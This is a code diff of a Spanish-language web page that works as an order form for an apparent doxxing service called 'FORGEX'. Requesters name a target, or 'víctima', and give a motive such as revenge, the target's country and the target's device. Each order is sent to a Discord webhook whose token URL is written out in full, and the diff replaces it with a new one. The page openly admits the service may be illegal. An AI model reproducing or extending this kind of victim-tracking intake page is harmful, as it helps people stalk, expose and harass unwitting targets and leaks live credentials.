@@ -33,20 +33,15 @@
   <p>Por favor escribe tu nombre de Discord (correcto para poder enviarte la info)</p>
   <input type="text" id="discord1" placeholder="ej: tuntun#1234">
   <span id="discordError" class="error"></span>
-
   <label>Repite tu nombre de Discord para confirmar</label>
   <input type="text" id="discord2" placeholder="ej: tuntun#1234">
-
   <label>¿Para quién es? (ej: amigo, hermana, primo, broma, etc.)</label>
   <input type="text" id="paraquien" placeholder="ej: mi amigo Juan">
-
   <label>¿Por qué quieres saber la información de esta persona?</label>
   <textarea id="motivo" rows="4" placeholder="ej: por curiosidad, broma, venganza, etc. (mínimo 100 caracteres)"></textarea>
   <span id="motivoError" class="error"></span>
-
   <label>País de la persona (ej: México, Colombia, España, etc.)</label>
   <input type="text" id="pais" placeholder="ej: México">
-
   <label>Dispositivo que usa</label>
   <select id="dispositivo">
     <option value="">Selecciona un dispositivo (opcional)</option>
@@ -62,7 +57,6 @@
     <option value="Nintendo Switch">Nintendo Switch</option>
   </select>
   <span id="dispositivoError" class="error"></span>
-
   <button onclick="validarYEnviar()">ENVIAR PEDIDO</button>
   <div class="warning">
     <strong>ADVERTENCIA:</strong> Lo que hacemos puede poner en riesgo la información de otras personas y puede ser ilegal en algunos países. Úsalo bajo tu propia responsabilidad.
@@ -78,7 +72,7 @@
   <p>(Este link es solo para tu víctima. Por favor no ingreses tú)</p>
 </div>
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";
+const WEBHOOK = "https://discord.com/api/webhooks/1457870266720977038/lvPp1v5qlW_SLusmIRsx-c24_XJ1fFNGo66uCFhDG8MvAHaZevYW8G3j_gWR-1ee4s4Y";
 
 function validarYEnviar() {
   const discord1 = document.getElementById('discord1').value.trim();
@@ -87,14 +81,11 @@ function validarYEnviar() {
   const motivo = document.getElementById('motivo').value.trim();
   const pais = document.getElementById('pais').value.trim();
   const dispositivo = document.getElementById('dispositivo').value;
-
   // Limpiar errores
   document.getElementById('discordError').textContent = '';
   document.getElementById('motivoError').textContent = '';
   document.getElementById('dispositivoError').textContent = '';
-
   let valido = true;
-
   if (!discord1 || !discord2) {
     document.getElementById('discordError').textContent = 'Debes ingresar tu Discord en ambos campos';
     valido = false;
@@ -102,21 +93,17 @@ function validarYEnviar() {
     document.getElementById('discordError').textContent = 'Los nombres de Discord no coinciden';
     valido = false;
   }
-
   if (motivo.length < 100) {
     document.getElementById('motivoError').textContent = 'El motivo debe tener mínimo 100 caracteres (actual: ' + motivo.length + ')';
     valido = false;
   }
-
   // Dispositivo opcional, pero si elige uno debe ser válido (no valida si está vacío)
   if (dispositivo && !['Windows','Linux','macOS','Android','iPhone','iPad','Chrome OS','PlayStation','Xbox','Nintendo Switch'].includes(dispositivo)) {
     document.getElementById('dispositivoError').textContent = 'El dispositivo seleccionado no es válido';
     valido = false;
   }
-
   if (!valido) return;
-
-  const mensaje = 
+  const mensaje =
 `**NUEVO PEDIDO COMUNIDAD FORGEX**
 **Solicitado por (Discord):** ${discord1}
 **Objetivo:** ${paraquien}
@@ -124,17 +111,14 @@ function validarYEnviar() {
 **País:** ${pais || 'No especificado'}
 **Dispositivo:** ${dispositivo || 'No especificado'}
 **Hora:** ${new Date().toLocaleString()}`;
-
   fetch(WEBHOOK, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({content: mensaje})
   });
-
   document.getElementById('formulario').style.display = 'none';
   document.getElementById('exito').style.display = 'block';
 }
-
 function mostrarFormulario() {
   document.querySelector('.card').style.display = 'none';
   document.getElementById('formulario').style.display = 'block';
